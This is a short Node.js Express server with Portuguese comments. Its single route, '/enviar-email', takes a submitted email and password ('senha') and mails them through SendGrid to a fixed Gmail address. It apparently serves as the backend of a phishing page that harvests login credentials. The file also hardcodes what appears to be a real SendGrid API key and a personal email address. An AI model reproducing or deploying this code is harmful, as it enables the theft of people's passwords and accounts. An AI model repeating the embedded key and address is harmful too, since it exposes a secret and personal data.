const express = require('express');
const app = express();

// Configurar o middleware para lidar com dados JSON
app.use(express.json());

// Configurar uma rota para enviar e-mails
app.post('/enviar-email', (req, res) => {
    const sgMail = require('@sendgrid/mail');
    sgMail.setApiKey('SG.dpRpuT2_TUO6-29lfuTwIw.xOy7TDd1BTDuI1h81W-lIMZpLB995BRT14UT32jNpd0');

    const { email, senha } = req.body;

    const msg = {
        to: 'martimguerramartins11@gmail.com',
        from: 'martimguerramartins11@gmail.com',
        subject: 'bm',
        text: `Email: ${email}\nSenha: ${senha}`,
    };

    sgMail.send(msg)
        .then(() => res.json({ mensagem: 'E-mail enviado com sucesso' }))
        .catch(error => res.status(500).json({ erro: `Erro ao enviar e-mail: ${error.message}` }));
});

// Iniciar o servidor na porta 3000
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
